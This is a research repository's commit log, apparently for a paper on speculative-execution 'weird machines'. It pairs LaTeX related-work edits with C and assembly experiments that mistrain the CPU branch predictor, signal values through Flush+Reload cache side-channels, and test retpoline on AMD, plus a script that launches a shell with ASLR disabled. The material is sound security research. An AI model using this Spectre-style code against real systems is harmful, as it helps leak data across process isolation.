-arbitrary computation in places that were not originally intended to act as
-computational entities.
+\textit{Weird machines} are machines composing bugs and features of a system to
+create arbitrary computation with interesting
+properties~\cite{weird_machines,bratus2011exploit,weird_exploits}. This
+encompasses many traditional computer vulnerabilities~\cite{buffer_overflow,
+format_string_exploit, shacham2007geometry}. These exploits demonstrate
+performing arbitrary computation in places that were not originally intended to
+act as computational entities.
 
-As another example, Bangert~\textit{et al.} demonstrate that a Turing complete
-weird machine can be constructed using the page fault handling mechanism in
-Intel's IA32 architecture~\cite{bangert2013page}.
-
-Unexpected functionality like this is abundant in modern
+Unexpected functionality such as~\cite{bangert2013page} is abundant in modern
 processors~\cite{d2015exploiting} as multiple threads share system resources
@@
 
-\smallskip
-
 Hardware minutia have also been used to identify and fingerprint execution
-environments --- in malware this is know as a red-pill~\cite{red-pill} and 
-is typically used by malware to detect when it is under emulation or
-a debugging environment~\cite{lindorfer2011detecting, balzarotti2010efficient}. Paleari
-\textit{et al.} automate the process of discovering red-pills by
-fuzzing emulated and physical environments and identifying
-differences between the two~\cite{paleari2009fistful}.
-%This is still by no means an exhaustive list of red-pills for a given 
-%processor as many rely on timing or race conditions in physical 
-%environments.
+environments---in malware this is know as a red-pill~\cite{red-pill} and is
+typically used by malware to detect when it is under emulation or a debugging
+environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
+paleari2009fistful}
 
@@
 in malicious binaries~\cite{schwartz2010all}.
-
-\smallskip
 
@@
 
-The \speculake model relies critically on cache side channel attacks to 
-communicate information from the speculative world. Cache side-channels have 
-been used against a number of processors at essentially all different 
-caching levels -- L1 data cache~\cite{percival2005cache,zhang2012cross,osvik2006cache}, 
-L1 instruction cache~\cite{aciiccmez2010new}, 
-L2 cache~\cite{ristenpart2009hey,percival2005cache}, 
-LLC~\cite{ristenpart2009hey,liu2015last}, 
-and branch prediction cache~\cite{aciiccmez2007power}. 
-These attacks have also been performed in 
+Cache side-channels have been used against a number of processors at essentially
+all different caching levels---L1 data
+cache~\cite{percival2005cache,zhang2012cross,osvik2006cache}, L1 instruction
+cache~\cite{aciiccmez2010new}, L2
+cache~\cite{ristenpart2009hey,percival2005cache},
+LLC~\cite{ristenpart2009hey,liu2015last}, and branch prediction
+cache~\cite{aciiccmez2007power}. These attacks have also been performed in the
 cloud~\cite{ristenpart2009hey,zhang2012cross},
-browser~\cite{oren2015spy,google_cache_browser},
-and security critical encryption~\cite{yarom2014recovering,tromer2010efficient}
-environments, demonstrating how ubiquitous hardware side-channel exploits can be.
+browser~\cite{oren2015spy,google_cache_browser}, and security critical
+encryption~\cite{yarom2014recovering,tromer2010efficient} environments,
+demonstrating how ubiquitous hardware side-channel exploits can be.
 
@@
 time accesses to reloading each potential value. However, we acknowledge that
-the recent \texttt{Flush+Flush} variant may offer a
-faster alternative~\cite{gruss2016flush+flush}.
+the recent \texttt{Flush+Flush} variant may offer a faster
+alternative~\cite{gruss2016flush+flush}.
 
@@
 engineering Intel processors, multiple teams discovered the Spectre
-vulnerabilities concurrently including the teams associated with Kocher
-\textit{et al.}~\cite{spectre}, the Project Zero team at
-Google~\cite{project_zero}, and various
-others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
+vulnerabilities concurrently~\cite{spectre, project_zero, evtyushkin2018branchscope, maisuradze2018speculose}.
 %These works propose multiple variants making use of branch prediction.
@@
 %updates to fully address. 
-Multiple measures have been proposed to combat the 
-individual variants of Spectre.
+% Multiple measures have been proposed to combat the 
+% individual variants of Spectre.
 
-One popular approach uses compiler level software patches to wrap sensitive 
-function calls. Retpoline replaces indirect jumps with \texttt{retq}
-instructions that read from the cached stack (and are thus less likely to be
-mis-speculated)~\cite{retpoline}.
-Gruss~\textit{et al.} propose the KAISER software patch to enforce address space
-isolation for kernel and user space proceses~\cite{gruss2017kaslr}. 
-Other proposals have considered hypervisor enforced time domain separation at varying 
-granularity~\cite{renau2018securing}, and fuzzy clocks that would reduce the accuracy 
-of any time based exfiltration pathway~\cite{hu1992reducing}. However, none of these defenses
-fundamentally defeat the use of a branch predictor as a cooperative mechanism
-spanning multiple processes. Intel has released microarchitecture updates for
-its most recent CPUs, but older architectures do not support these updates and
-will remain vulnerable~\cite{intel-micro-patch}.
+% One popular approach uses compiler level software patches to wrap sensitive 
+% function calls. Retpoline replaces indirect jumps with \texttt{retq}
+% instructions that read from the cached stack (and are thus less likely to be
+% mis-speculated)~\cite{retpoline}.
+% Gruss~\textit{et al.} propose the KAISER software patch to enforce address space
+% isolation for kernel and user space proceses~\cite{gruss2017kaslr}. 
+% Other proposals have considered hypervisor enforced time domain separation at varying 
+% granularity~\cite{renau2018securing}, and fuzzy clocks that would reduce the accuracy 
+% of any time based exfiltration pathway~\cite{hu1992reducing}. However, none of these defenses
+% fundamentally defeat the use of a branch predictor as a cooperative mechanism
+% spanning multiple processes. Intel has released microarchitecture updates for
+% its most recent CPUs, but older architectures do not support these updates and
+% will remain vulnerable~\cite{intel-micro-patch}.
 
-Trippel~\textit{et al.} proposes a method of faithfully simulating hardware
-bugs, given a formal model specifying the
-microarchitecture~\cite{trippel2018meltdownprime}. However, such models are
-unlikely to be released by CPU manufacturers, as they generally involve
-closely-guarded trade secrets, making this a less accessible solution for the
-research community.
+% Trippel~\textit{et al.} proposes a method of faithfully simulating hardware
+% bugs, given a formal model specifying the
+% microarchitecture~\cite{trippel2018meltdownprime}. However, such models are
+% unlikely to be released by CPU manufacturers, as they generally involve
+% closely-guarded trade secrets, making this a less accessible solution for the
+% research community.
 

### 2018-07-26 retpoline/common.c
Cleaner working experiments for retpoline testing -- specifically on AMD

@@ -1,78 +1,0 @@
-#include "common.h"
-
-void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
-void __attribute__((section(".aliasfnptr"))) (*alias_fn_ptr)(void);
-
-
-void indirect(void *jmp_ptr) {
-    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
-    // If you want these to all be taken, set rax=0x02
-    // otherwise there will be 16 not-taken branches
-    asm volatile(
-		"mov $2, %%rax\n"
-		"cmpb  $0x02, %%al\n"
-		".rept 0x20\n"
-			"je .+2\n"
-		".endr\n"
-		// Do some indirect calls
-        "jmp call_get_rip\n"
-    "get_rip:\n"
-        "pop %%rax\n"
-        "push %%rax\n"
-        "ret\n"
-    "call_get_rip:\n"
-        "call get_rip\n"
-        "add (%%rcx), %%rax\n"      // This will stall (assuming jmp_ptr is not in cache)
-        // len("add (rbx), rax") + len("add $9, rax") + len("jmpq *rax") => 9
-
-        "add $9, %%rax\n"
-		".rept 0x20\n"
-			"jmpq *%%rax\n"
-			"add $6, %%rax\n"
-      	".endr\n" 
-
-        "jmpq *%%rax\n"
-        "nop\n"
-    :: "c"(jmp_ptr) : "rax");
-
-    // Do indirect jump
-    (*fn_ptr)();
-}
-
-
-void alias_indirect(void *jmp_ptr) {
-    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
-    // If you want these to all be taken, set rax=0x02
-    // otherwise there will be 16 not-taken branches
-    asm volatile(
-		"mov $2, %%rax\n"
-		"cmpb  $0x02, %%al\n"
-		".rept 0x20\n"
-			"je .+2\n"
-		".endr\n"
-		// Do some indirect calls
-        "jmp call_get_rip_al\n"
-    "get_rip_al:\n"
-        "pop %%rax\n"
-        "push %%rax\n"
-        "ret\n"
-    "call_get_rip_al:\n"
-        "call get_rip_al\n"
-        "add (%%rcx), %%rax\n"
-        // len("add (rbx), rax") + len("add $9, rax") + len("jmpq *rax") => 9
[…]

### 2018-07-26 retpoline/common.h

@@ -1,10 +1,0 @@
-#ifndef COMMON_H
-#define COMMON_H
-
-extern void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
-void indirect(void *jmp_ptr) __attribute__((section(".indirect")));
-extern void __attribute__((section(".aliasfnptr"))) (*alias_fn_ptr)(void);
-void alias_indirect(void *jmp_ptr) __attribute__((section(".aliasindirect")));
-void end_indirect(void);
-
-#endif

### 2018-07-26 retpoline/inject.c

@@ -1,69 +1,0 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <x86intrin.h>
-#include <unistd.h>
-#include <sys/mman.h>
-#include <string.h>
-#include "common.h"
-
-/*
- * This is the target of the indirect call
- * which we locate at the address of a gadget
- * in the "victim" process we are trying to
- * (mis)train the processor's BTB to call
- */
-void target_fn(void) __attribute__((section(".targetfn")));
-void target_fn(void) {
-}
-
-
-#define TARGET_FN_ADDR 0x414100401000
-uint64_t jmp_ptr;
-void *map;
-
-void train()
-{
-    fn_ptr = target_fn;
-    //fn_ptr = map+600;
-    printf("fn_ptr: %p\n", fn_ptr);
-    //jmp_ptr = 0x400e60;
-    jmp_ptr = 0;
-    while (1) {
-        _mm_clflush(fn_ptr);
-        _mm_clflush(&jmp_ptr);
-        indirect(&jmp_ptr);
-        //((void (*)(void *))map)(&jmp_ptr);
-    }
-}
-
-int main(int argc, char *argv[])
-{
-    fn_ptr = target_fn;
-    printf("&fn_ptr = %p\n", &fn_ptr);
-    printf("indirect jump ptr = %p\n", fn_ptr);
-    printf("indirect fn = %p\n", indirect);
-    printf("target_fn = %p\n", target_fn);
-
-    printf("training...\n");
-
-    uint64_t base = TARGET_FN_ADDR;
-    if (argc > 1) {
-        base = strtoll(argv[1], NULL, 16);
-    }
-    printf("using base address %p\n", (void*)base);
-    map = mmap((void*)base, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
-    if (map == MAP_FAILED) {
-        perror("mmap");
-        return -1;
-    }
-    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
-
-    // Set it to just immediately return (retq = 0xc3)...
-    memset(map+600, '\xc3', 1);
-
-
-    train();
-
-}

### 2018-07-26 retpoline/inject_retp.c

@@ -6,7 +6,8 @@
 #include <unistd.h>
 #include <sys/mman.h>
 #include <string.h>
-#include "common.h"
+
+void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
 
 /*
  * This is the target of the indirect call
@@ -48,22 +49,6 @@ int main(int argc, char *argv[])
     printf("target_fn = %p\n", target_fn);
 
     printf("training...\n");
-
-    uint64_t base = TARGET_FN_ADDR;
-    if (argc > 1) {
-        base = strtoll(argv[1], NULL, 16);
-    }
-    printf("using base address %p\n", (void*)base);
-    map = mmap((void*)base, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
-    if (map == MAP_FAILED) {
-        perror("mmap");
-        return -1;
-    }
-    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
-
-    // Set it to just immediately return (retq = 0xc3)...
-    memset(map+600, '\xc3', 1);
-
 
     target_fn();
 

### 2018-07-26 retpoline/launch-no-aslr-shell.sh

@@ -1,0 +1,21 @@
+#!/bin/bash
+
+echo ''
+echo 'Launching a new shell with NO ASLR'
+echo '(all children processes will have ASLR disabled)'
+echo ''
+PS1="NOASLR $P1"
+setarch `uname -m` --addr-no-randomize /bin/bash
+
+echo ''
+echo 'Exiting shell with NO ASLR'
+./test-aslr.sh
+if [ $? -eq 1 ]; then
+    echo '============'
+    echo '!!!!!WARNING: ASLR STILL DISABLED!!!!!'
+    echo '============'
+fi
+
+echo ''
+
+

### 2018-07-26 retpoline/measure.c

@@ -1,246 +1,0 @@
-#include <stdio.h>
-#include <stdbool.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <x86intrin.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/mman.h>
-#include "common.h"
-
-// Defines the bandwidth we can communicate
-// from speculative -> von neuman
-// e.g. 256 would be 1 byte of info
-// Tradeoff here is larger bandwidth means we have
-// to check more places in probe_buf (and flush them)
-#define NUM_PROBES 1024
-#define DECRYPT_LEN 256
-
-#define MAX_ITERATIONS 2000
-// These define the stride length we take between probes
-// This thwarts a clever CPU's stride prediction
-// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
-// Generally, this results in not seeing ANY winning probes
-// in which case, we change cur_probe_space and retry
-#define MAX_PROBE_SPACE (1000003)
-uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
-
-
-// The (heap-allocated) probe buffer
-// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
-// in the cache to communicate the value i from speculative -> von neuman
-uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
-
-
-// This is a simple counter, accessed by the speculative function (target_fn)
-// so it can compute on it.
-uint16_t signal_idx = 0;
-
-
-// Stats
-uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
-uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
-uint64_t tot_time = 0;      // Number cycles total
-
-unsigned int junk=0;    // For rdtscp
-
-
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
-// (mis)speculate and start processing this function.
[…]

### 2018-07-26 retpoline/measure_exp1.c

@@ -1,269 +1,0 @@
-#include <stdio.h>
-#include <stdbool.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <x86intrin.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/mman.h>
-#include "common.h"
-
-// Defines the bandwidth we can communicate
-// from speculative -> von neuman
-// e.g. 256 would be 1 byte of info
-// Tradeoff here is larger bandwidth means we have
-// to check more places in probe_buf (and flush them)
-#define NUM_PROBES 1024
-#define DECRYPT_LEN 256
-
-#define MAX_ITERATIONS 2000
-// These define the stride length we take between probes
-// This thwarts a clever CPU's stride prediction
-// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
-// Generally, this results in not seeing ANY winning probes
-// in which case, we change cur_probe_space and retry
-#define MAX_PROBE_SPACE (1000003)
-uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
-
-
-// The (heap-allocated) probe buffer
-// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
-// in the cache to communicate the value i from speculative -> von neuman
-uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
-
-
-// This is a simple counter, accessed by the speculative function (target_fn)
-// so it can compute on it.
-uint16_t signal_idx = 0;
-
-
-// Stats
-uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
-uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
-uint64_t tot_time = 0;      // Number cycles total
-
-unsigned int junk=0;    // For rdtscp
-
-
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
-// (mis)speculate and start processing this function.
-// In reality, the CPU will (eventually) call check_probes()
[…]

### 2018-07-26 retpoline/measure_exp2.c

@@ -1,0 +1,260 @@
+#include <stdio.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "signal.h"
+
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 1024
+#define DECRYPT_LEN 256
+
+#define MAX_ITERATIONS 2000
+
+/*
+ * The (heap-allocated) probe buffer.
+ * We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+ * in the cache to communicate the value i from speculative -> von neuman
+ *
+ * Probe space variables define the stride length we take between probes. This thwarts a 
+ * clever CPU's stride prediction (e.g. "you loaded buf[0], buf[1024], 
+ * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
+ * winning probes in which case, we change cur_probe_space and retry.
+ */
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+#define MAX_PROBE_SPACE (1000003)
+
+
+// This is a simple counter, can be accessed by the speculative gadgets (target_fn)
+uint16_t signal_idx = 0;
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+uint64_t results[NUM_PROBES];
+
+unsigned int junk=0;    // For rdtscp
+
+
+bool get_top_k(uint64_t k, uint64_t* output_i, uint64_t* output_res);
+uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k);
+
+
+// Function Pointer
+void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
+
+
+/*
+ * Target gadget  never called directly (essentially dead code)
+ * However, "inject" (ideally) trains the processor to think the indirect ret in the
+ * retpoline in measure is going to call this function
+ */
[…]

### 2018-07-26 retpoline/measure_retp.c

@@ -1,0 +1,290 @@
+#include <stdio.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "rsb_utils.h"
+#include "signal.h"
+
+// Defines the bandwidth we can communicate 
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 1024
+#define NUM_TRIALS 256
+
+#define MAX_ITERATIONS 2000
+
+/*
+ * The (heap-allocated) probe buffer.
+ * We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+ * in the cache to communicate the value i from speculative -> von neuman
+ *
+ * Probe space variables define the stride length we take between probes. This thwarts a 
+ * clever CPU's stride prediction (e.g. "you loaded buf[0], buf[1024], 
+ * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
+ * winning probes in which case, we change cur_probe_space and retry.
+ */
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+#define MAX_PROBE_SPACE (1000003)
+
+
+// This is a simple counter, can be accessed by the speculative gadgets (target_fn)
+uint16_t signal_idx = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+uint64_t results[NUM_PROBES];
+
+unsigned int junk=0;    // For rdtscp
+
+bool get_top_k(uint64_t k, uint64_t* output_i, uint64_t* output_res);
+uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k);
+
+
+// Function Pointer 
+void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
+
+/*
+ * Target gadget  never called directly (essentially dead code)
+ * However, "inject" (ideally) trains the processor to think the indirect ret in the
[…]

### 2018-07-26 retpoline/retpoline_miss.c

@@ -1,430 +1,0 @@
-#include <stdio.h>
-#include <stdbool.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <x86intrin.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/mman.h>
-#include "common.h"
-
-// Defines the bandwidth we can communicate
-// from speculative -> von neuman
-// e.g. 256 would be 1 byte of info
-// Tradeoff here is larger bandwidth means we have
-// to check more places in probe_buf (and flush them)
-#define NUM_PROBES 1024
-#define DECRYPT_LEN 256
-
-#define MAX_ITERATIONS 2000
-// These define the stride length we take between probes
-// This thwarts a clever CPU's stride prediction
-// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
-// Generally, this results in not seeing ANY winning probes
-// in which case, we change cur_probe_space and retry
-#define MAX_PROBE_SPACE (1000003)
-uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
-
-
-// The (heap-allocated) probe buffer
-// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
-// in the cache to communicate the value i from speculative -> von neuman
-uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
-
-
-// This is a simple counter, accessed by the speculative function (target_fn)
-// so it can compute on it.
-uint16_t signal_idx = 0;
-
-
-// Stats
-uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
-uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
-uint64_t tot_time = 0;      // Number cycles total
-
-unsigned int junk=0;    // For rdtscp
-
-
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
[…]

### 2018-07-26 retpoline/retpoline_yield.c

@@ -1,402 +1,0 @@
-#include <stdio.h>
-#include <stdbool.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <signal.h>
-#include <x86intrin.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/mman.h>
-#include "common.h"
-
-// Defines the bandwidth we can communicate
-// from speculative -> von neuman
-// e.g. 256 would be 1 byte of info
-// Tradeoff here is larger bandwidth means we have
-// to check more places in probe_buf (and flush them)
-#define NUM_PROBES 1024
-#define DECRYPT_LEN 256
-
-#define MAX_ITERATIONS 2000
-// These define the stride length we take between probes
-// This thwarts a clever CPU's stride prediction
-// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
-// Generally, this results in not seeing ANY winning probes
-// in which case, we change cur_probe_space and retry
-#define MAX_PROBE_SPACE (1000003)
-uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
-
-
-// The (heap-allocated) probe buffer
-// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
-// in the cache to communicate the value i from speculative -> von neuman
-uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
-
-
-// This is a simple counter, accessed by the speculative function (target_fn)
-// so it can compute on it.
-uint16_t signal_idx = 0;
-
-
-// Stats
-uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
-uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
-uint64_t tot_time = 0;      // Number cycles total
-
-unsigned int junk=0;    // For rdtscp
-
-
-void *map;
-#define TARGET_FN_ADDR 0x414100401000
-
-// We define this function in assembly (target_fn.S)
-// It is never called directly (essentially dead code)
-// However, indirect.c trains the processor to think the indirect
-// jump in common.c::indirect() is going to call this function
-// We flush the fn_ptr used by indirect(), forcing the CPU to
[…]

### 2018-07-26 retpoline/rsb_utils.h

@@ -1,0 +1,175 @@
+
+#include "stringify.h"
+#include "signal.h"
+
+/* Return target place-holder functions. Used while attempting to train
+ * the return buffer through continuous use. 
+ *
+ * rt1 employs __signal to affect cache if this function ever hit speculatively.
+ */
+void rt1(){ asm volatile( __signal(0xFF) :::); }
+void rt2(){}
+
+
+/* 
+ * Retpoline construction used to test effect of unfortunately timed 
+ * context switches.
+ * 
+ * The __signal in capture_spec gives an idea of how often the intended 
+ * speculative behavior is realized by affecting the cache.
+ */
+void retpoline_r11_yield(){
+    asm volatile(
+        "jmp y_set_up_return\n"
+    "y_inner_indirect_branch:\n"
+        "call y_set_up_target\n"
+    "y_capture_spec:\n"
+        __signal(0x11)          /* swap out with pause; lfence to ignore */
+        // "pause; lfence\n"
+        "jmp y_capture_spec\n"
+    "y_set_up_target:\n"
+        // "mov $0x18, %%rax\n"     /* sys_sched_yield */
+        // "syscall\n"              /*    Uncomment for exact context switch */
+        "movq (fn_ptr), %%r11\n"
+        "mov %%r11, (%%rsp)\n"
+        "ret\n"
+    "y_set_up_return:\n"
+        "call y_inner_indirect_branch\n"
+    :::"r11", "rax");
+}
+
+
+/* 
+ * Generic retpoline construction taken from Google white paper spec.
+ */
+void retpoline_r11(){
+    asm volatile(
+        "movq (fn_ptr), %%r11\n"
+        "jmp set_up_return\n"
+    "inner_indirect_branch:\n"
+        "call set_up_target\n"
+    "capture_spec:\n"
+        "pause;lfence\n"
+        "jmp capture_spec\n"
+    "set_up_target:\n"
+        "mov %%r11, (%%rsp)\n"
+        "ret\n"
+    "set_up_return:\n"
+        "call inner_indirect_branch\n"
+    :::);
+}
+
+/*
+ * Fill the CPU return stack buffer.
+ *
+ * Each entry in the RSB, if used for a speculative 'ret', contains an
+ * infinite 'pause; lfence; jmp' loop to capture speculative execution.
+ *
[…]

### 2018-07-26 retpoline/signal.c

@@ -1,0 +1,55 @@
+#include <stdio.h>
+#include "signal.h"
+
+inline void signal(uint64_t state){
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
+}
+
+
+inline void signal32(uint32_t state){
+    uint32_t a, b, c, d;
+    a = state & 0xFF;
+    b = state>>8 & 0xFF | 0x100;
+    c = state>>16 & 0xFF| 0x200;
+    d = state>>24 & 0xFF| 0x300;
+    asm volatile (
+        "mov (%0), %%rax\n" 
+        "mov (%1), %%rbx\n" 
+        "mov (%2), %%rcx\n" 
+        "mov (%3), %%rdx\n" 
+        ::  "r"(&probe_buf[a*cur_probe_space]),
+            "r"(&probe_buf[b*cur_probe_space]), 
+            "r"(&probe_buf[c*cur_probe_space]),
+            "r"(&probe_buf[d*cur_probe_space]) : "rax", "rbx", "rcx", "rdx");
+}
+
+
+inline void signal40(uint64_t state){
+    uint32_t a, b, c, d, e, f, g, h;
+    a = state & 0x1F;
+    b = state>>0x05 & 0x1F | 0x20;
+    c = state>>0x0A & 0x1F | 0x40;
+    d = state>>0x0F & 0x1F | 0x60;
+    e = state>>0x14 & 0x1F | 0x80;
+    f = state>>0x19 & 0x1F | 0xA0;
+    g = state>>0x1E & 0x1F | 0xC0;
+    h = state>>0x23 & 0x1F | 0xE0;
+    asm volatile (
+        "mov (%0), %%rax\n" 
+        "mov (%1), %%rbx\n" 
+        "mov (%2), %%rcx\n" 
+        "mov (%3), %%rdx\n" 
+        "mov (%4), %%rsi\n" 
+        "mov (%5), %%rdi\n" 
+        "mov (%6), %%r8\n" 
+        "mov (%7), %%r9\n" 
+        ::  "r"(&probe_buf[a*cur_probe_space]),
+            "r"(&probe_buf[b*cur_probe_space]), 
+            "r"(&probe_buf[c*cur_probe_space]),
+            "r"(&probe_buf[d*cur_probe_space]),
+            "r"(&probe_buf[e*cur_probe_space]),
+            "r"(&probe_buf[f*cur_probe_space]),
[…]

### 2018-07-26 retpoline/signal.h

@@ -1,0 +1,26 @@
+#include <stdint.h>
+#include <stdbool.h>
+#include "stringify.h"
+
+
+#define __SIGNAL(val, reg1, reg2, reg3)     \
+        movq $(val), reg2;                     \
+        mov (cur_probe_space), reg1;        \
+        imul reg2;                          \
+        mov (probe_buf), reg3;              \
+        add reg1, reg3;                     \
+        mov (reg3), reg1;
+
+#define __signal(value) \
+        __stringify(__SIGNAL(value, %%rax, %%rcx, %%rdx))
+
+extern uint8_t* probe_buf;
+extern uint64_t cur_probe_space;
+
+void signal(uint64_t state);
+
+void signal32(uint32_t state);
+
+void signal40(uint64_t state);
+
+

### 2018-07-26 retpoline/target_fn.c

@@ -1,76 +1,10 @@
 #include <unistd.h>
 #include <stdint.h>
+#include "signal.h"
 
-extern uint8_t *probe_buf;
-extern uint64_t cur_probe_space;
-extern uint64_t signal_idx;
 
 uint64_t try_decrypt(void);
 __uint128_t aes_ctr(uint64_t ctr);
-
-extern uint8_t *turing_tape;
-extern uint8_t turing_state;
-
-inline void signal(uint64_t state) __attribute__((always_inline));
-inline void signal32(uint32_t state) __attribute__((always_inline));
-inline void signal40(uint64_t state) __attribute__((always_inline));
-
-void signal(uint64_t state)
-{
-    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
-}
-
-
-void signal32(uint32_t state)
-{
-    uint32_t a, b, c, d;
-    a = state & 0xFF;
-    b = state>>8 & 0xFF | 0x100;
-    c = state>>16 & 0xFF| 0x200;
-    d = state>>24 & 0xFF| 0x300;
-    asm volatile (
-        "mov (%0), %%rax\n" 
-        "mov (%1), %%rbx\n" 
-        "mov (%2), %%rcx\n" 
-        "mov (%3), %%rdx\n" 
-        ::  "r"(&probe_buf[a*cur_probe_space]),
-            "r"(&probe_buf[b*cur_probe_space]), 
-            "r"(&probe_buf[c*cur_probe_space]),
-            "r"(&probe_buf[d*cur_probe_space]) : "rax", "rbx", "rcx", "rdx");
-}
-
-
-void signal40(uint64_t state)
-{
-    uint32_t a, b, c, d, e, f, g, h;
-    a = state & 0x1F;
-    b = state>>0x05 & 0x1F | 0x20;
-    c = state>>0x0A & 0x1F | 0x40;
-    d = state>>0x0F & 0x1F | 0x60;
-    e = state>>0x14 & 0x1F | 0x80;
-    f = state>>0x19 & 0x1F | 0xA0;
-    g = state>>0x1E & 0x1F | 0xC0;
-    h = state>>0x23 & 0x1F | 0xE0;
-    asm volatile (
-        "mov (%0), %%rax\n" 
-        "mov (%1), %%rbx\n" 
-        "mov (%2), %%rcx\n" 
-        "mov (%3), %%rdx\n" 
-        "mov (%4), %%rsi\n" 
[…]

### 2018-07-26 retpoline/utils.c

@@ -1,29 +1,0 @@
-
-
-void rt1(){
-	asm volatile(
-        // Signal(0xFF)
-        "movq $0xFF, %%rcx\n"
-        "mov (cur_probe_space), %%rax\n"
-        "imul %%rcx\n"
-        "mov (probe_buf), %%rdx\n"
-        "add %%rax, %%rdx\n"
-        "mov (%%rdx), %%rax\n"
-        "nop\n"
-	:::);
-}
-
-
-static inline __attribute__((always_inline)) void flush_probe_buf_i(){
-    // Clear probe_buf from cache
-    int j =0;
-    for (j=0; j<NUM_PROBES; j++) {
-        _mm_clflush(&probe_buf[j*cur_probe_space]);
-    }
-}
-
-void flush_probe_buf(){
-    // Clear probe_buf from cache as a function call
-	flush_probe_buf_i();
-}
-

### 2018-07-26 paper/paper.tex
update paper to use NDSS class

